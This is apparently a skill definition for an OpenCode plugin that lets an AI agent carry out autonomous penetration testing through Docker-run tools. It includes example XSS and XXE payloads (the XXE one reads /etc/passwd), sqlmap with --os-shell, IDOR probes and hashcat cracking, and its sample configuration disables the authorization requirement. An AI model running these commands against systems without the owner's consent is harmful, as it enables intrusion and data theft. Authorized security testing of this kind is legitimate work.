---
name: shannon-pentest
description: "Autonomous penetration testing with Shannon. Execute security tools inside Docker containers — all commands run in Docker, real output returns to OpenCode's AI for analysis."
---

# Shannon Penetration Testing Skill

Autonomous pentesting powered by Docker-based security tools. OpenCode's AI does all reasoning — no separate API key needed. All tool execution happens inside a Docker container.

## Architecture

```
User -> OpenCode AI -> calls plugin tool -> tool runs `docker exec` -> real output returns -> AI reasons -> calls next tool
```

- **No separate AI sessions**: OpenCode's configured provider handles everything.
- **Docker only**: All security tools run inside the `shannon-tools` container. Nothing executes on the host.
- **Real output**: Every tool returns actual stdout/stderr from real security tools.

## Available Tools

### Docker Management
- **shannon_docker_init** -- Start the Shannon Docker container (call FIRST)
- **shannon_docker_cleanup** -- Stop and remove the container when done

### Core Execution
- **shannon_exec** -- Run ANY shell command inside Docker. The container has: nmap, sqlmap, nikto, subfinder, whatweb, gobuster, hydra, nuclei, ffuf, httpx, hashcat, john, curl, wget, dig, whois, Chromium + Playwright, Python3, and more.

### Phase-Specific Tools
- **shannon_recon** -- Run recon commands (nmap, subfinder, whatweb, dig, whois)
- **shannon_vuln_discovery** -- Run vuln scanning commands (nikto, sqlmap, gobuster, nuclei)
- **shannon_exploit** -- Run exploitation commands (authorized targets only)
- **shannon_report** -- Format findings into a structured report (markdown/json)

### Specialized Testing Tools
- **shannon_browser** -- Playwright browser automation for SPA/dynamic page testing. Essential for Angular, React, Vue apps where curl only sees the HTML shell.
- **shannon_idor_test** -- Systematic IDOR testing for cross-user resource access validation.
- **shannon_upload_test** -- File upload vulnerability testing (XXE, YAML bomb, polyglot, extension bypass).

## Workflow

### 1. Initialize
```
Call shannon_docker_init to start the container
```

### 2. Reconnaissance
```
shannon_recon target="example.com" command="nmap -sV -sC -p 80,443 example.com"
shannon_recon target="example.com" command="subfinder -d example.com"
shannon_recon target="example.com" command="whatweb example.com"
shannon_exec command="dig example.com ANY"
shannon_exec command="whois example.com"
shannon_exec command="gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt"
```

### 3. Vulnerability Discovery
```
shannon_vuln_discovery target="example.com" command="nikto -h https://example.com"
shannon_vuln_discovery target="example.com" command="nuclei -u https://example.com"
shannon_exec command="sqlmap -u 'https://example.com/page?id=1' --batch --level=3"
```

### 4. Browser-Based Testing (for SPAs)
```
shannon_browser target="https://example.com" script="
await page.goto('https://example.com')
title = await page.title()
print(f'Page title: {title}')
content = await page.content()
print(f'Body length: {len(content)}')
"
```

#### XSS Testing with Browser
```
shannon_browser target="https://example.com" script="
await page.goto('https://example.com/#/search?q=<img src=x onerror=alert(1)>')
await page.wait_for_timeout(2000)
content = await page.content()
if 'onerror' in content:
    print('VULNERABLE: Reflected XSS in search')
else:
    print('NOT VULNERABLE: Input sanitized')
"
```

#### Client-Side Storage Analysis
```
shannon_browser target="https://example.com" script="
await page.goto('https://example.com')
storage = await page.evaluate('''
    () => ({
        localStorage: Object.entries(localStorage),
        sessionStorage: Object.entries(sessionStorage),
        cookies: document.cookie
    })
''')
print(storage)
"
```

### 5. IDOR Testing
```
shannon_idor_test target="https://example.com" command="curl -s -w '\\nHTTP_CODE:%{http_code}' -H 'Authorization: Bearer USER_A_TOKEN' https://example.com/api/Users/2"
shannon_idor_test target="https://example.com" command="curl -s -w '\\nHTTP_CODE:%{http_code}' -H 'Authorization: Bearer USER_A_TOKEN' https://example.com/api/Baskets/2"
```

### 6. File Upload Testing
```
shannon_upload_test target="https://example.com/file-upload" command="echo '<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>' > /tmp/xxe.xml && curl -X POST -F 'file=@/tmp/xxe.xml;type=text/xml' https://example.com/file-upload"
```

### 7. Exploitation (Authorized Only)
```
shannon_exploit target="example.com" command="sqlmap -u 'https://example.com/vuln?id=1' --os-shell"
```

### 8. Hash Cracking
```
shannon_exec command="echo 'e10adc3949ba59abbe56e057f20f883e' > /tmp/hashes.txt && hashcat -m 0 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt --force"
shannon_exec command="john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt"
```

### 9. Reporting
```
shannon_report target="example.com" findings="<paste all findings>" format="markdown"
```

### 10. Cleanup
```
shannon_docker_cleanup
```

## Configuration

In `~/.config/opencode/shannon-plugin.json`:

```json
{
  "shannon": {
    "require_authorization": false,
    "docker_enabled": true,
    "docker_image": "shannon-tools",
    "browser_testing": true,
    "idor_testing": true,
    "upload_testing": true
  }
}
```

- `require_authorization: false` -- For bug bounty / internal teams
- `docker_image` -- Must be pre-built: `docker build -t shannon-tools .`
- `browser_testing` -- Enable/disable Playwright browser tool
- `idor_testing` -- Enable/disable IDOR testing tool
- `upload_testing` -- Enable/disable file upload testing tool

## Vulnerability Categories Covered

| Category | Tools Used |
|----------|-----------|
| SQL Injection | sqlmap, shannon_exec (curl) |
| NoSQL Injection | shannon_exec (curl with $ne/$gt/$regex) |
| XSS (Reflected/Stored/DOM) | shannon_browser (Playwright), shannon_exec (curl) |
| XXE | shannon_upload_test, shannon_exec |
| SSRF | shannon_exec (curl) |
| YAML Injection | shannon_upload_test |
| IDOR | shannon_idor_test |
| Privilege Escalation | shannon_exec (curl with role injection) |
| File Upload Attacks | shannon_upload_test |
| Business Logic Flaws | shannon_exec (curl), shannon_browser |
| Auth/Session Issues | shannon_exec, shannon_browser |
| Information Disclosure | shannon_recon, shannon_exec |
| Security Misconfig | shannon_vuln_discovery (nikto, nuclei) |
| Password Cracking | shannon_exec (hashcat, john) |

## Ethics

**ONLY test systems you own or have explicit written authorization to test.**
Unauthorized testing is illegal under CFAA (US), Computer Misuse Act (UK), and similar laws.

## Limitations

- Docker must be installed and running
- The `shannon-tools` image must be built before first use
- Some tools require network access (container uses `--network host`)
- Complex exploitation may require human judgment
- Playwright browser testing requires Chromium in the Docker image (included in default build)

